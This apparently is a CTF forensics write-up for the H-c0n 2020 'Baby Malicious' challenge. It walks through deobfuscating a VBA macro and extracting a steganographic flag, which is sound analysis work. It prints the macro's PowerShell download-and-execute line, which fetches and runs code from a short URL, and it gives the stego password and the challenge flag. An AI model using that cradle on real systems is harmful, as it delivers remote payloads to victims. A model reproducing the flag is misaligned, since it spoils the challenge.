# Forensics
## Baby Malicious

![Screenshot](https://raw.githubusercontent.com/Gh05t1nTh3SSH/Write-ups/master/CTF/H-c0n%202020/Images/Baby%20Malicious/title.png)

I never worked before or heard about **.vba** files, so I started checking the type and format

![Screenshot](https://raw.githubusercontent.com/Gh05t1nTh3SSH/Write-ups/master/CTF/H-c0n%202020/Images/Baby%20Malicious/file.png)

As I saw that is an ASCII text, I decided to open the file with **cat**

![Screenshot](https://raw.githubusercontent.com/Gh05t1nTh3SSH/Write-ups/master/CTF/H-c0n%202020/Images/Baby%20Malicious/cat.png)

The first impresion was that the text was encrypted, so I searched about [Obfuscation](https://en.wikipedia.org/wiki/Obfuscation_(software)) and I found something perfect for this ocasion.

A tool called [ViperMonkey](https://github.com/decalage2/ViperMonkey).

ViperMonkey is a VBA Emulation engine written in Python, designed to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files (Word, Excel, PowerPoint, Publisher, etc).

After using the tool I saw the following:

![Screenshot](https://raw.githubusercontent.com/Gh05t1nTh3SSH/Write-ups/master/CTF/H-c0n%202020/Images/Baby%20Malicious/vmonkey.png)

There are 3 interesting function calls:

1. | CreateObject      | ['WScript.Shell']         |
2. | Run               | ["powershell.exe -NoLogogoiex ((New-Object Net.WebClient).D0wnloadString('https://bit.ly/2NgCC0O'))",0]
3. | Run               | ly/2NgCC0O'))             |

The next step was visit the url: *https://bit.ly/2NgCC0O*

![Screenshot](https://raw.githubusercontent.com/Gh05t1nTh3SSH/Write-ups/master/CTF/H-c0n%202020/Images/Baby%20Malicious/dios.png)

I thought that this is only the first part of the challenge and some stego was involucred, so I took a look at the next parameter of the macro.

![Screenshot](https://raw.githubusercontent.com/Gh05t1nTh3SSH/Write-ups/master/CTF/H-c0n%202020/Images/Baby%20Malicious/bps.png)

[BPStegano](https://github.com/TapanSoni/BPStegano) is a steganography tool created by students at Rowan University for their graduate cryptography class. 

Once we use the tool with the image found giving **SALCHICHON** as a password, we get the flag

![Screenshot](https://raw.githubusercontent.com/Gh05t1nTh3SSH/Write-ups/master/CTF/H-c0n%202020/Images/Baby%20Malicious/decode.png)

## Flag

H-c0n{5619b327cc5ecce85a7fc99a14a6c5c5}

![Screenshot](https://raw.githubusercontent.com/Gh05t1nTh3SSH/Write-ups/master/CTF/H-c0n%202020/Images/Baby%20Malicious/complete.png)
